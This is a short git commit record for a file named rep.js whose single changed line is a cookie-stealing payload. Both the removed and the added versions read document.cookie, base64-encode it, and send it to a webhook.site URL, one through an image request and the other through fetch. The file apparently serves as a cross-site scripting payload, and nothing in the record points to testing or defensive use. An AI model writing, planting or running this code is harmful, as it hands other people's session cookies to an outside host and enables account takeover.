6c1c085cb5f0c7656bcf6993cdb5cd782740201e
cacicjo <75219617+cacicjo@users.noreply.github.com>
2025-01-15 21:04:59 +0100

    Update rep.js

--- rep.js
+++ rep.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/bab28309-966d-4631-ae78-df189b6db4e3?data='+btoa(document.cookie);
+fetch('https://webhook.site/bab28309-966d-4631-ae78-df189b6db4e3?data='+btoa(document.cookie));
